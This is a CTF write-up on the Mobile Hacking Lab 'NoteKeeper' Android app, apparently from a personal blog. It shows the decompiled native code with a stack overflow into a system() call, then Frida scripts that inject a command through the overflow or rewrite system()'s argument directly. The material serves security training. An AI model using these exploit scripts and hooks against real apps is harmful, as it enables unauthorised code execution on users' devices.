---
date: '2025-04-08T23:00:57+08:00'
title: 'MHL Note Keeper'
tags:
    - MHL
    - Android CTF
---

## Challenge Description

> Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.
>
> [notekeeper.apk](static/notekeeper.apk)

## Solution

I started out by performing static analysis to look into the code

### Static Analysis

I started out by looking into the `AndroidManifest.xml`.

```xml
<activity
    android:name="com.mobilehackinglab.notekeeper.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

There's only one activity at the moment so lets look into it.

```java

public final native String parse(String Title);

public static final void showDialogue$lambda$1(EditText $ed_title, EditText $ed_content, MainActivity this$0, Dialog dialog, View it) {
    Intrinsics.checkNotNullParameter(this$0, "this$0");
    Intrinsics.checkNotNullParameter(dialog, "$dialog");
    String title_ = $ed_title.getText().toString();
    String note_con = $ed_content.getText().toString();
    if (title_.length() > 0) {
        if (note_con.length() > 0) {
            String cap_title = this$0.parse(title_);
            note_data dataElement = new note_data(cap_title, note_con, "Number of characters : " + note_con.length());
            this$0.notes.add(dataElement);
            Note_Adapter note_Adapter = this$0.notes_adp;
            if (note_Adapter == null) {
                Intrinsics.throwUninitializedPropertyAccessException("notes_adp");
                note_Adapter = null;
            }
            note_Adapter.notifyDataSetChanged();
            dialog.dismiss();
            return;
        }
    }
    Toast.makeText(this$0, "Don't leave the title or note field empty", 0).show();
}



static {
    System.loadLibrary("notekeeper");
}

```

After reading some code, I noticed that this application need to load a shared library and it has a native function `parse`. Aside from that, the `showDialogue$lambda$1` is the function where it will trigger the native function `parse`. I then proceed to read the shared library by using `ghidra`.

```cpp

undefined8
Java_com_mobilehackinglab_notekeeper_MainActivity_parse
          (_JNIEnv *param_1,undefined8 param_2,_jstring *param_3)

{
  int local_2a8;
  char local_2a4 [100];
  char acStack_240 [500];
  int local_4c;
  ushort *local_48;
  _jstring *local_40;
  undefined8 local_38;
  _JNIEnv *local_30;
  undefined8 local_28;
  
  local_40 = param_3;
  local_38 = param_2;
  local_30 = param_1;
  local_48 = (ushort *)_JNIEnv::GetStringChars(param_1,param_3,(uchar *)0x0);
  local_4c = _JNIEnv::GetStringLength(local_30,local_40);
  memcpy(acStack_240,"Log \"Note added at $(date)\"",500);
  if (local_48 == (ushort *)0x0) {
    local_28 = 0;
  }
  else {
    local_2a4[0] = FUN_00100bf4(*local_48 & 0xff);
    for (local_2a8 = 1; local_2a8 < local_4c; local_2a8 = local_2a8 + 1) {
      local_2a4[local_2a8] = (char)local_48[local_2a8];
    }
    system(acStack_240);
    local_2a4[local_2a8] = '\0';
    local_28 = _JNIEnv::NewStringUTF(local_30,local_2a4);
  }
  return local_28;
}

```

Based on the C++ code, I noticed that there's a function `system` that it used to execute command. Aside from that, it has a for loop that will write every char input into a variable `local_2a4` but the variable can only support up to 100 characters `char local_2a4 [100];`. Since this challenge has something to do with buffer overflow, I suspect this is the place that I should inject my code where I perform buffer overflow and write into the `acStack_240`. Now from what I understand, time to try it with dynamic analysis.

### Dynamic Analysis

I started out by playing around with the application.

![alt text](img/index.png#center)

I noticed that after I tried to execute the native function `parse`, I dont get any useful information from it. I then tried to hook using Frida. To do so, start a frida server first.

```bash
beryllium:/ # /data/local/tmp/frida-server
```

After setting a frida-server in the rooted devices, I then proceed to write some simple script to check what its doing.

```js
ava.perform(()=> {

    

    let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    MainActivity["parse"].implementation = function (Title) {
        console.log(`MainActivity.parse is called: Title=${Title}`);
        let result = this["parse"](Title);
        console.log(`MainActivity.parse result=${result}`);
        return result;
    };
})
```

```powershell
PS E:\Desktop\Android\frida-script> frida -U -N com.mobilehackinglab.notekeeper -l a.js
     ____
    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-> MainActivity.parse is called: Title=q
MainActivity.parse result=Q
```

I tried feeding in random data again and use frida to check the input and output, which basically taking `q` as input and `Q` as output. Things isnt right here as I need to get the `system` function to see what it's doing. I then tried to write another frida script to try and hook the `system` function.

```js
Interceptor.attach(Module.getExportByName(null, "system"), {
    onEnter: function (args) {
        var command = Memory.readUtf8String(args[0]);
        console.log("[*] system() called with command: " + command);
        console.log(hexdump(args[0],{offset: 0,length:48}));

    },
    onLeave: function (retval) {
        console.log("[*] system() returned with code: " + retval);
    }
});
```

After adding this, I managed to read some information from the `system` function.

```powershell
PS E:\Desktop\Android\frida-script> frida -U -N com.mobilehackinglab.notekeeper -l a.js
     ____
    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-> MainActivity.parse is called: Title=q
[*] system() called with command: Log "Note added at $(date)"
             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
7ff3ad0850  4c 6f 67 20 22 4e 6f 74 65 20 61 64 64 65 64 20  Log "Note added
7ff3ad0860  61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00  at $(date)".....
7ff3ad0870  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
[*] system() returned with code: 0x7f00
MainActivity.parse result=Q
```

I managed to read the `system` function input by using the frida script. Now the only thing that I should do is just performing buffer overflow to rewrite the `system` function input. I started out by trying to add 101 characters to see how it works. I rewrite the frida script to make things easier.

```js
let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
MainActivity["parse"].implementation = function (Title) {
    Title = "A".repeat(100) + "B";
    console.log(`MainActivity.parse is called: Title=${Title}`);
    let result = this["parse"](Title);
    console.log(`MainActivity.parse result=${result}`);
    return result;
};

```

```powershell
PS E:\Desktop\Android\frida-script> frida -U -N com.mobilehackinglab.notekeeper -l a.js
     ____
    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-> MainActivity.parse is called: Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
[*] system() called with command: Bog "Note added at $(date)"
             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
7ff3ad0850  42 6f 67 20 22 4e 6f 74 65 20 61 64 64 65 64 20  Bog "Note added
7ff3ad0860  61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00  at $(date)".....
7ff3ad0870  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
[*] system() returned with code: 0x7f00
MainActivity.parse result=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
```

As shown in the result, it is possible to rewrite the stack / `system` funtion input as it changed from `Log` to `Bog` which is our input. I now just need to change it into my command to perform RCE.

```js
let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
MainActivity["parse"].implementation = function (Title) {
    let command = "id >> /sdcard/Download/hacked.txt"
    Title = "A".repeat(100) + command;
    console.log(`MainActivity.parse is called: Title=${Title}`);
    let result = this["parse"](Title);
    console.log(`MainActivity.parse result=${result}`);
    return result;
};
```

By using this script, I successfully injected my command using buffer overflow technique.

```powershell
PS E:\Desktop\Android\frida-script> frida -U -N com.mobilehackinglab.notekeeper -l a.js
     ____
    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-> MainActivity.parse is called: Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid >> /sdcard/Download/hack.txt
[*] system() called with command: id >> /sdcard/Download/hack.txt
             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
7ff3ad0960  69 64 20 3e 3e 20 2f 73 64 63 61 72 64 2f 44 6f  id >> /sdcard/Do
7ff3ad0970  77 6e 6c 6f 61 64 2f 68 61 63 6b 2e 74 78 74 00  wnload/hack.txt.
7ff3ad0980  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
[*] system() returned with code: 0x0
MainActivity.parse result=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid >> /sdcard/Download/hack.txt
```

I then checked it the POC is created or not.

```bash
beryllium:/sdcard/Download # cat hack.txt
uid=10344(u0_a344) gid=10344(u0_a344) groups=10344(u0_a344),3003(inet),9997(everybody),20344(u0_a344_cache),50344(all_a344) context=u:r:untrusted_app:s0:c88,c257,c512,c768
```

I managed to perform RCE by abusing the buffer overflow. Here's a full frida script that I wrote.

```js
Java.perform(()=> {

    

    let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    MainActivity["parse"].implementation = function (Title) {
        let command = "id >> /sdcard/Download/hack.txt"
        Title = "A".repeat(100) + command;
        console.log(`MainActivity.parse is called: Title=${Title}`);
        let result = this["parse"](Title);
        console.log(`MainActivity.parse result=${result}`);
        return result;
    };

    
    test1();
})

function test1(){
    Interceptor.attach(Module.getExportByName(null, "system"), {
        onEnter: function (args) {
            var command = Memory.readUtf8String(args[0]);
            console.log("[*] system() called with command: " + command);
            console.log(hexdump(args[0],{offset: 0,length:48}));

        },
        onLeave: function (retval) {
            console.log("[*] system() returned with code: " + retval);
        }
    });
    
}
```

Aside from this, I found another method which I could utilize the frida functionality to overwrite the stack / `system` function input instead of abusing the buffer overflow. 

```js
Interceptor.attach(Module.getExportByName(null, "system"), {
    onEnter: function (args) {
        var command = Memory.readUtf8String(args[0]);
        console.log("[*] system() called with command: " + command);
        console.log(hexdump(args[0],{offset: 0,length:48}));

        var newCommand = "id >> /sdcard/Download/hack2.txt";
        Memory.writeUtf8String(args[0], newCommand);

        console.log("[+] Replaced with new command:", Memory.readUtf8String(args[0]));
        console.log(hexdump(args[0],{offset: 0,length:48}));


    },
    onLeave: function (retval) {
        console.log("[*] system() returned with code: " + retval);
    }
});
```

By using this `writeUtf8String`, I could just rewrite the stack / `system` function input.

```powershell
PS E:\Desktop\Android\frida-script> frida -U -N com.mobilehackinglab.notekeeper -l a.js
     ____
    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-> MainActivity.parse is called: Title=qa
[*] system() called with command: Log "Note added at $(date)"
             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
7ff3ad0970  4c 6f 67 20 22 4e 6f 74 65 20 61 64 64 65 64 20  Log "Note added
7ff3ad0980  61 74 20 24 28 64 61 74 65 29 22 00 00 00 00 00  at $(date)".....
7ff3ad0990  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
[+] Replaced with new command: id >> /sdcard/Download/hack2.txt
             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
7ff3ad0970  69 64 20 3e 3e 20 2f 73 64 63 61 72 64 2f 44 6f  id >> /sdcard/Do
7ff3ad0980  77 6e 6c 6f 61 64 2f 68 61 63 6b 32 2e 74 78 74  wnload/hack2.txt
7ff3ad0990  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
[*] system() returned with code: 0x0
MainActivity.parse result=Qa
```

Here's the result.

```bash
beryllium:/sdcard/Download # cat hack2.txt
uid=10344(u0_a344) gid=10344(u0_a344) groups=10344(u0_a344),3003(inet),9997(everybody),20344(u0_a344_cache),50344(all_a344) context=u:r:untrusted_app:s0:c88,c257,c512,c768
```

This is another thing that I found interesting and here's the full frida script for this.

```js
Java.perform(()=> {

    

    let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    MainActivity["parse"].implementation = function (Title) {
        // let command = "id >> /sdcard/Download/hack.txt"
        // Title = "A".repeat(100) + command;
        console.log(`MainActivity.parse is called: Title=${Title}`);
        let result = this["parse"](Title);
        console.log(`MainActivity.parse result=${result}`);
        return result;
    };

    test2();
})

function test2(){
    Interceptor.attach(Module.getExportByName(null, "system"), {
        onEnter: function (args) {
            var command = Memory.readUtf8String(args[0]);
            console.log("[*] system() called with command: " + command);
            console.log(hexdump(args[0],{offset: 0,length:48}));

            var newCommand = "id >> /sdcard/Download/hack2.txt";
            Memory.writeUtf8String(args[0], newCommand);

            console.log("[+] Replaced with new command:", Memory.readUtf8String(args[0]));
            console.log(hexdump(args[0],{offset: 0,length:48}));


        },
        onLeave: function (retval) {
            console.log("[*] system() returned with code: " + retval);
        }
    });
    
}
```

## Things I learned from this challenge

- buffer overflow in android
- frida checking function input and output
- hooking `system` function and rewrite the input by changing it in the stack. 